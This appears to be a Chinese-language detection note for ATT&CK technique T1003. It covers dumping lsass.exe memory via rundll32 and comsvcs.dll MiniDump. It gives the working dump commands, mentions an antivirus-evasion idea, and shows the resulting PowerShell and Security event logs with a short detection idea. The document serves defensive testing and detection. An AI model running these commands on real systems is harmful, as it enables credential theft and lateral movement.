# T1003-win-使用comsvcs.dll转储Lsass.exe内存

## 来自ATT&CK的描述

凭据转储是从操作系统和软件获取账号登录名和密码（哈希或明文密码）信息的过程。然后可以使用凭据来执行横向移动并访问受限制的信息。

攻击者和专业安全测试人员都可能会使用此技术中提到的几种工具。也可能存在其他自定义工具。

## 测试案例

comsvcs.dll，在系统崩溃时转储进程内存的系统窗口和系统32，通过rundll32编写，该dll包含函数MiniDump。

## 检测日志

- windows 安全日志
- windows Sysmon日志
- Windows Powershell日志

## 测试复现

```yml
powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 648 C:\AtomicRedTeam\lsass.dmp full"
#注意：这里648是lsass.exe的PID。
#通过命令tasklist | findstr lsass.exe查找PID值。

C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
```

可直接调用rundll32进程(**需要Admin或Root权限**)，在2021年2月一篇文章中提到通过修改comsvcs.dll路径或名称，可绕过火绒/360安全卫士，经过10月实际测试，无法绕过360安全卫士。

## 测试留痕

```log
#Powershell日志，事件ID:400
引擎状态已从 None 更改为 Available。

详细信息: 
 NewEngineState=Available
 PreviousEngineState=None

 SequenceNumber=13

 HostName=ConsoleHost
 HostVersion=5.1.14393.206
 HostId=beebd53e-f854-42ea-8d25-a148d224b726
 HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c rundll32 C:\windows\system32\comsvcs.dll, MiniDump 648 C:\AtomicRedTeam\lsass.dmp full
 EngineVersion=5.1.14393.206
 RunspaceId=af860283-73a9-452c-a1cd-ea808dbaf232
 PipelineId=
 CommandName=
 CommandType=
 ScriptName=
 CommandPath=
 CommandLine=
```

```log
#windows安全日志，事件ID：4688
已创建新进程。

创建者主题:
 安全 ID:  QAX\Administrator
 帐户名:  Administrator
 帐户域:  QAX
 登录 ID:  0xCF2BF2

目标主题:
 安全 ID:  NULL SID
 帐户名:  -
 帐户域:  -
 登录 ID:  0x0

进程信息:
 新进程 ID:  0x11020
 新进程名称: C:\Windows\System32\rundll32.exe
 令牌提升类型: %%1936
 强制性标签:  Mandatory Label\High Mandatory Level
 创建者进程 ID: 0x1abc
 创建者进程名称: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 进程命令行: "C:\Windows\system32\rundll32.exe" C:\windows\system32\comsvcs.dll MiniDump 648 C:\AtomicRedTeam\lsass.dmp full

“令牌提升类型”表示根据用户帐户控制策略分配给新进程的令牌类型。

类型 1 是未删除特权或未禁用组的完全令牌。完全令牌仅在禁用了用户帐户控制或者用户是内置管理员帐户或服务帐户的情况下使用。

类型 2 是未删除特权或未禁用组的提升令牌。当启用了用户帐户控制并且用户选择使用“以管理员身份运行”选项启动程序时，会使用提升令牌。当应用程序配置为始终需要管理特权或始终需要最高特权并且用户是管理员组的成员时，也会使用提升令牌。

类型 3 是删除了管理特权并禁用了管理组的受限令牌。当启用了用户帐户控制，应用程序不需要管理特权并且用户未选择使用“以管理员身份运行”选项启动程序时，会使用受限令牌。
```

## 检测规则/思路

重点关注rundll32进程的异常行为。由于dll名称可变，无法通过日志针对进程名称进行有效监测。

## 建议

安装终端防护似乎是个不错的选择。

## 参考推荐

MITRE-ATT&CK-T1003

<https://attack.mitre.org/techniques/T1003/>

comsvcs.dll转储lsass（过360卫士&火绒）

<https://www.cnblogs.com/Yang34/p/14418572.html>

Windows明文密码获取

<https://blog.csdn.net/xiangshen1990/article/details/104865393>
